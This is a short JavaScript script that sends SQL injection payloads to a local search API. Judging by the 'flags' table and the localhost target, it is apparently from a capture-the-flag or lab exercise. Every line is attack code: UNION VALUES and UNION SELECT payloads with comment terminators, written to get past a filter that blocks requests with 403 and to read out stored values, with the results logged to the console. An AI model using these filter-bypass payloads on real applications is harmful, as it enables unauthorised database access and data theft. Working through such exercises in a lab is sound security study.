const bypassSearch = async (payload) => {
    const res = await fetch(`http://localhost:4000/api/search?q=${encodeURIComponent(payload)}`);
    if (res.status !== 403) {
      console.log(`[SUCCESS SEARCH] Payload: ${payload} | Status: ${res.status}`);
      const text = await res.text();
      console.log(`Response: ${text}\n`);
    } else {
        console.log(`[BLOCKED SEARCH] Payload: ${payload}`);
    }
};

const run = async () => {
    // If UNION VALUES(x, y) works, can we put a subquery inside VALUES?
    await bypassSearch("%' UNION VALUES(1, (SELECT flag_value FROM flags))/*");
    await bypassSearch("%' UNION VALUES(1, (SELECT flag_value FROM flags))--");
    
    // How about getting around the UNION SELECT regex?
    await bypassSearch("%' UNION SELECT flag_value FROM flags/*");
};

run();
